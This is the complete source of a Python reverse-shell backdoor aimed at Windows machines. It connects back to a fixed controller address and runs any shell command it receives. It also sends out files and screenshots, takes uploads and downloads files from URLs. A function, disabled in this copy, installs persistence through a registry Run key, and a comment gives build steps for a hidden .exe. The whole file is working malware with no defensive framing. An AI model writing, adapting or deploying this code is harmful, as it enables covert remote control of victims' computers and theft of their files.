#!/usr/bin/python
#-----------------------------------------------------------------------------------------------------
# rev_shell
#-----------------------------------------------------------------------------------------------------
import os
import sys
import json
import time
import socket
import shutil
import base64
import requests
import pyautogui
import subprocess

class reverse_shell:
    sock = None
    #----------------------------------------------------------------------------------------------------------------------------------------------------
    #copy_me: to copy the executable a different(safe location) & to store it in registry key dir, to run the backdoor whenever victim starts the machine 
    #----------------------------------------------------------------------------------------------------------------------------------------------------   
    def copy_me(self):
        # use the following command(in cmd) for compiling the script to get .exe
        # wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe reverse_shell.py --onefile --noconsole
        location = os.environ["appdata"] + "\\backdoor.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell = True)

    def reliable_recv(self):
        recv_data = ""
        while True:
            try:
                recv_data = self.sock.recv(1024)
                return json.loads(recv_data)
            except ValueError:
                continue

    def reliable_send(self, result):
        self.sock.send(json.dumps(result))

    def establish_connection(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.sock.connect(("192.168.2.8",54321))
                print "connetion established !"
                return
            except:
                print "trying to reconnect ..."
                time.sleep(5)
                continue
    
    def download_from_internet(self, url):
        if len(url) == 0:
            return "[error]: missing URL\n[usage]: wget [URL].."
        else:
            try:
                response  = requests.get(url)
                file_name = url.split("/")[-1]
                with open(file_name, "wb") as downloaded_file:
                    downloaded_file.write(response.content)
                return "[+] Downloaded File from the specified URL"
            except:
                return "[error]: Failed to download"

    def take_screenshot(self):
        filename = time.strftime("%Y-%m-%d_%H-%M-%S", time.gmtime()) + ".png"
        try:
            print "taking cap"
            pyautogui.screenshot(filename)
            print "took cap "
            with open(filename, "rb") as cap_file:
                self.reliable_send(base64.b64encode(cap_file.read()))
        except:
            self.reliable_send("[error]: unable to take screenshot")

    def reply_change_dir(self, command):
        try:
            os.chdir(command[3:])
            self.reliable_send(os.getcwd())
        except:
            self.reliable_send("[error]: no such directory")
    
    def reply_download(self, command):
        try:
            with open(command[9:],"rb") as file_for_upload:
                self.reliable_send(base64.b64encode(file_for_upload.read()))
        except:
            self.reliable_send("[error]: no such file")

    def reply_upload(self, command):
        uploaded_data = self.reliable_recv()
        if not uploaded_data == "failed":
            with open(command[7:], "wb") as uploaded_file:
                uploaded_file.write(base64.b64decode(uploaded_data))

    def run_rev_shell(self):
        while True:
            command = self.reliable_recv()
            if command == "q" or command == "quit" or command == "exit":
                break
            
            elif len(command)>1 and command[:2] == "cd":
                self.reply_change_dir(command)
                continue
            
            elif len(command)>=8 and command[:8] == "download":
                self.reply_download(command)
            
            elif len(command)>=6 and command[:6] == "upload":
                self.reply_upload(command)
                continue
            
            elif len(command)>=4 and command[:4] == "wget":
                self.reliable_send(self.download_from_internet(command[5:]))
            
            elif len(command)>=10 and command[:10] == "screenshot":
                self.take_screenshot()
            else:
                try:
                    process = subprocess.Popen(command , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                    result  = process.stdout.read() + process.stderr.read()
                    self.reliable_send(result)
                except:
                    self.reliable_send("[error]: could not run the command!")
                    continue
    def close_conn(self):
        self.sock.close()


obj = reverse_shell()
obj.establish_connection()
#obj.copy_me()
obj.run_rev_shell()
obj.close_conn()
